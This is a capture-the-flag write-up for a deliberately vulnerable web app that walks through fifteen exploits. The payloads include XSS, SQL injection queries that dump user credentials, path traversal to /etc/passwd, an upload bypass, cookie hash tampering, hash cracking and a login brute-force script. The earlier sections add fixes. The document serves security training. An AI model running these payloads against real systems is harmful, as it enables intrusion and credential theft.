# Exploits and Fixes

## 1. Hidden Email Exploit

### Exploit
By inspecting the HTML code of the password recovery page, we can see a hidden email field:

```html
<form action="#" method="POST">
    <input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
    <input type="submit" name="Submit" value= "Submit">
</form>
```

Changing the value of this hidden input allows unauthorized email changes and retrieval of sensitive information.

**Flag:** `d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0`

### Fix
- Remove hidden fields for sensitive data.
- Use session-based authentication.
- Validate server-side email recovery requests.

---

## 2. XSS via Feedback Form

### Exploit
Injecting a script in an input field triggers an alert:

```html
<svg onload=alert(1)>test
```

**Flag:** `0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e`

### Fix
- Escape user input using libraries like `htmlspecialchars()`.
- Implement Content Security Policy (CSP).
- Sanitize input before rendering.

---

## 3. File Upload Bypass

### Exploit
Altering the `multipart/form-data` header allows unauthorized file uploads:

```bash
curl -X POST -H "multipart/form-data" -F "uploaded=@./test.jpeg" -F "Upload=Upload" "http://172.19.71.187/?page=upload;type=image/jpeg" | grep flag
```

**Flag:** `46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8`

### Fix
- Restrict file types and validate MIME types.
- Store uploads outside the web root.
- Scan uploaded files for malware.

---

## 4. HTTP Header Manipulation

### Exploit
Bypassing security checks using `Referer` and `User-Agent` headers:

```bash
curl -H "Referer: https://www.nsa.gov/" -H "User-Agent: ft_bornToSec" http://172.19.71.187/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
```

**Flag:** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

### Fix
- Avoid security based on headers alone.
- Implement authentication mechanisms.

---

## 5. SQL Injection

### Exploit
Using SQL injection to extract database information:

```sql
1 UNION ALL SELECT NULL,version()-- 
```

Extracting database names:

```sql
1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--
```

Extracting table names:

```sql
1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=0x4D656D6265725F53716C5F496E6A656374696F6E-- 
```

Extracting sensitive data:

```sql
1 UNION ALL SELECT NULL,concat(Commentaire,countersign) FROM users--
```

Cracking hashed password:

```bash
echo -n fortytwo | shasum -a 256
```

**Flag:** `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

### Fix
- Use prepared statements.
- Sanitize inputs.
- Implement web application firewalls (WAFs).

---

## 6. Image Metadata Extraction

### Exploit
Extracting data from `Member_images.list_images`:

```sql
1 UNION ALL SELECT NULL,concat(url,title,comment) FROM Member_images.list_images--
```

Decoding the MD5 hash:

```bash
echo -n albatroz | shasum -a 256
```

**Flag:** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

### Fix
- Restrict database queries.
- Hide table structures.
- Implement access control measures.

---

## 7. Cookie Manipulation

### Exploit
Identifying weak hashing in cookies:

```bash
I_am_admin 68934a3e9455fa72420237eb05902327
```

Cracking the MD5 hash:

```bash
68934a3e9455fa72420237eb05902327 : false
```

Changing to `true`:

```bash
b326b5062b2f0e69046810717534cb09
```

**Flag:** `df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3`

### Fix
- Use secure cookie attributes.
- Implement HMAC-based session management.
- Enforce strong encryption algorithms.

---



# 8

### Exploit

when you naviguate to page you found this -> ?page=survey
So test to naviguate to hidden folder en boom 

http://172.19.71.187/?page=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd

Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 


# 9 

### Exploit

On the bottom on the page you found a redirect link to facebook instram and twitter

Just try to modify the redirect link with other things
http://172.19.71.187/index.php?page=redirect&site=test  and BOOM the flag

Good Job Here is the flag : b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3


# 10

### Exploit

When you visite the robot.txt
you shot that ->
http://172.19.71.187/robots.txt

User-agent: *
Disallow: /whatever
Disallow: /.hidden

so let's check what is inside 

inside whatever i found this 
htpasswd                                           29-Jun-2021 18:09                  38

so check what's is inside=>
root:437394baff5aa33daa618be47b75cb49

is like a hash so check what type is flag 
and with site online i found this Hash type:	MD5 or MD4
now need to check if is already inside rainbow table
https://hashes.com/en/decrypt/hash

and found this ->
437394baff5aa33daa618be47b75cb49:qwerty123@

so let's try with in /admin page 

and found this flag ->
The flag is : d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff

# 11


## exploit

i found this page when a click on the image on home page ->
http://172.28.162.203/index.php?page=media&src=nsa


so let's try to crack &src=

inject some paylod and try

if y put some legit is working like this http://172.28.162.203/index.php?page=media&src=index.php

so let's try with my payload =>
data:text/html;<script>alert(42)</script>

not working but try with base64 
data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=

and found flag ->The flag is : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d

# 12

## epxloit

let's try to check if the post in survey works 
http://172.28.162.203/?page=survey#

so when i check the network config a show that -> sujet=4&valeur=10 in post for this url 
http://172.28.162.203/?page=survey

sol l'ets try

curl 'http://x.x.x.x/index.php?page=survey#' --data 'sujet=2&valeur=42'
and get the flag 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa


#13 

## exploit

in the recover page i found a hidden input is email sot let's check if a change 


curl 'http://x.x.x.x/?page=recover#' --data 'mail=test%40test.test&Submit=Submit'


and found flag:
1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0


# 14
## exploit

inside the .robot.txt i found .hidde and inside folder inside folder so let's try to scrawl all with script


```python3
import requests
import time
from urllib.parse import urljoin

session = requests.Session()

def crawl(url, visited=set(), depth=0, max_depth=15):
    if url in visited or depth > max_depth:
        return
    visited.add(url)

    try:
        r = session.get(url, timeout=5)
        if r.status_code != 200:
            return

        print(f"[+] {url}")

        lines = r.text.splitlines()
        for line in lines:
            if 'href="' in line:
                start = line.find('href="') + 6
                end = line.find('"', start)
                href = line[start:end]

                if href == '../':
                    continue

                full_url = urljoin(url, href)

                if href.endswith('/'):
                    time.sleep(0.1)
                    crawl(full_url, visited, depth + 1)
                else:
                    print(f"    ‚îî‚îÄ‚îÄ {full_url}")
                    # Si le fichier contient "README"
                    if 'README' in href.upper():
                        try:
                            file_response = session.get(full_url, timeout=5)
                            if file_response.status_code == 200:
                                print("        --- Contenu du README ---")
                                print(file_response.text)
                                print("        --------------------------")
                        except requests.exceptions.RequestException as e:
                            print(f"        [!] Erreur lors de la lecture du fichier : {e}")

    except requests.exceptions.RequestException as e:
        print(f"[!] Erreur sur {url} : {e}")

# üîç Exemple d'URL √† lancer
crawl("http://172.28.162.203/.hidden/")

```

and found flag


# 15 

## exploti 

brut force login 
so for that juste put the most common list on user name password and try so let's go
http://172.28.162.203/index.php?page=signin&username=test&password=test&Login=Login
``` bash
import requests

passwords = [
    "123456", "password", "12345678", "qwerty", "abc123", "123456789", "111111", "1234567",
    "iloveyou", "adobe123", "123123", "Admin", "1234567890", "letmein", "photoshop", "1234",
    "monkey", "shadow", "sunshine", "12345", "password1", "princess", "azerty", "trustno1", "000000"
]

url = "http://192.168.2.128/index.php"
params = {
    "page": "signin",
    "username": "admin",
    "Login": "Login#"
}

for pwd in passwords:
    params["password"] = pwd
    try:
        response = requests.post(url, params=params)
        if "flag" in response.text:
            print(f"[+] Mot de passe trouv√©: {pwd}")
            print(response.text)
            break
    except requests.RequestException as e:
        print(f"Erreur avec le mot de passe '{pwd}': {e}")


```
test.py 
[+] Mot de passe trouv√©: shadow and found

The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
